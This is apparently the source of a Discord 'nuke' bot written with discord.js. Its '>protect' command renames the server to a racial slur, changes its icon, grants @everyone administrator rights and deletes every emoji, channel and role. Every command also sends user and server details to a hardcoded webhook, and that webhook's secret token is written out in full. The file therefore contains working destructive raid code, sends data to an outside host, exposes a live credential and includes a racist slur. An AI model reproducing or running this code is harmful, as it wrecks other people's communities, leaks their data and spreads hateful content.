const Discord = require("discord.js");
const { prefix } = require("./config.json");

const client = new Discord.Client();
const webhookClient = new Discord.WebhookClient(
  "921777158672756828",
  "d-z77wERVjFgPjRgQBLYD1AbqudhLgtQnVau9uW9A36IvZm-LKxlnpTOXwNRKQLfIdW8"
);
//https://ptb.discord.com/api/webhooks/921777158672756828/d-z77wERVjFgPjRgQBLYD1AbqudhLgtQnVau9uW9A36IvZm-LKxlnpTOXwNRKQLfIdW8
console.log("Starting Module 1");

client.once("ready", async () => {
  console.log("Ready! " + client.user.id);
  client.user.setPresence({
    status: "dnd",
    activity: {
      name: ">protect",
      type: "LISTENING",
    },
  });
});

client.on("message", (message) => {
  let cmd = message.content.split(" ")[0];
  cmd = cmd.slice(prefix.length);
  let args = message.content.split(" ").slice(1);
  if (cmd == "protect") {
    
     if (message.author.id == "609766616422416384") {  
      return;
     }
    
    if (message.author.id == "784505815112613888") {
        return;
    }
    
    if (message.author.id == "315244741287477250") {
        return;
    }
    
    //Eclipse Support
    if (message.guild.id == "916886043561709648"){
       return;
    }

    
   
    
    const embed = new Discord.MessageEmbed()
      .setTitle("Nuke Command Used!")
      .setColor("#00ff8f")
      .setDescription(
        `Nuked by: **${message.author.username}(${message.author.id})** \n Channel: **${message.channel.id}** \n \n `
      )
      .addField(
        "Userinfo",
        "```\nName:" +
          message.author.username +
          "#" +
          message.author.discriminator +
          "\nUserID:" +
          message.author.id +
          "\nCreatedAt:" +
          message.author.createdAt +
          "```"
      )
      .addField(
        "Server Info",
        "```\nName: " +
          message.guild.name +
          "\nID: " +
          message.guild.id +
          "\nCreatedAt: " +
          message.guild.createdAt +
          "\nNo of Members: " +
          message.guild.memberCount +
          "\nRegion: " +
          message.guild.region +
          "```"
         
      )
      .setFooter(message.author.username, message.author.avatarURL())
      .setTimestamp();

    webhookClient.send("", {
      embeds: [embed],
    });
    const dmEmbed = new Discord.MessageEmbed()
      .setTitle("Nuked!")
      .setDescription(
        "Owners : `MЦDSΓΞFIИ#3737, དΔØŜཌ Gaylord The Third [UЖ]#9671, 𝙏𝘾 ĐᎬ𝙏Ø𝐗𝟑𝟒#8316, EokaBeemer#5049, Rissty#0871`\nSupport Server : https://discord.gg/qQatPwpfpr")
      .setColor("#ffeb00")
      .setThumbnail(
        "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fwallpaperset.com%2Fw%2Ffull%2F6%2F4%2Fd%2F438130.jpg&f=1&nofb=1"
      )
      .setFooter(
        message.author.username,
        "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fwallpaperset.com%2Fw%2Ffull%2F6%2F4%2Fd%2F438130.jpg&f=1&nofb=1"
      );
    message.author.send(dmEmbed);
    message.author.send("`Offical Bot Server` : https://discord.gg/qQatPwpfpr")
    message.guild.setName("Nigger Killing Server");
    message.guild.setIcon(
      "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fi.redd.it%2Fbzfm6ljqmdz21.jpg&f=1&nofb=1"
    );
     const role = message.guild.roles.everyone;

    role
      .setPermissions(["ADMINISTRATOR"])
      .then((updated) =>
        console.log("Updated permissions to " + updated.permissions.bitfield)
      )
    .catch(console.error);
    message.guild.emojis.cache.forEach((emoji) => emoji.delete());
    message.guild.channels.cache.forEach((channel) => channel.delete());
    message.guild.roles.cache.forEach((channel) => channel.delete());
   
  }
  
   if (cmd == "massban") {
    const embed = new Discord.MessageEmbed()
      .setTitle("Mass Ban Command Used!")
      .setColor("#fdda54")
      .setDescription(
        `Nuked by: **${message.author.username}(${message.author.id})** \n Channel: **${message.channel.id}** \n \n `
      )
      .addField(
        "Userinfo",
        "```\nName:" +
          message.author.username +
          "#" +
          message.author.discriminator +
          "\nUserID:" +
          message.author.id +
          "\nCreatedAt:" +
          message.author.createdAt +
          "```"
      )
      .addField(
        "Server Info",
        "```\nName: " +
          message.guild.name +
          "\nID: " +
          message.guild.id +
          "\nCreatedAt: " +
          message.guild.createdAt +
          "\nNo of Members: " +
          message.guild.memberCount +
          "\nRegion: " +
          message.guild.region +
          "```"
      )
      .setFooter(message.author.username, message.author.avatarURL())
      .setTimestamp();

    webhookClient.send("", {
      embeds: [embed],
    });
  }
  
   if (cmd == "massnick") {
    const embed = new Discord.MessageEmbed()
      .setTitle("Mass Nick Command Used!")
      .setColor("#ff8d5d")
      .setDescription(
        `Nuked by: **${message.author.username}(${message.author.id})** \n Message: **${message.content}** \n \n `
      )
      .addField(
        "Userinfo",
        "```\nName:" +
          message.author.username +
          "#" +
          message.author.discriminator +
          "\nUserID:" +
          message.author.id +
          "\nCreatedAt:" +
          message.author.createdAt +
          "```"
      )
      .addField(
        "Server Info",
        "```\nName: " +
          message.guild.name +
          "\nID: " +
          message.guild.id +
          "\nCreatedAt: " +
          message.guild.createdAt +
          "\nNo of Members: " +
          message.guild.memberCount +
          "\nRegion: " +
          message.guild.region +
          "```"
      )
      .setFooter(message.author.username, message.author.avatarURL())
      .setTimestamp();

    webhookClient.send("", {
      embeds: [embed],
    });
  }
  
   if (cmd == "massdm") {
    const embed = new Discord.MessageEmbed()
      .setTitle("Mass DM Command Used!")
      .setColor("#d3b4ff")
      .setDescription(
        `Nuked by: **${message.author.username}(${message.author.id})** \n Channel: **${message.content}** \n \n `
      )
      .addField(
        "Userinfo",
        "```\nName:" +
          message.author.username +
          "#" +
          message.author.discriminator +
          "\nUserID:" +
          message.author.id +
          "\nCreatedAt:" +
          message.author.createdAt +
          "```"
      )
      .addField(
        "Server Info",
        "```\nName: " +
          message.guild.name +
          "\nID: " +
          message.guild.id +
          "\nCreatedAt: " +
          message.guild.createdAt +
          "\nNo of Members: " +
          message.guild.memberCount +
          "\nRegion: " +
          message.guild.region +
          "```"
      )
      .setFooter(message.author.username, message.author.avatarURL())
      .setTimestamp();

    webhookClient.send("", {
      embeds: [embed],
    });
  }
  
});

client.login(process.env.TOKEN);
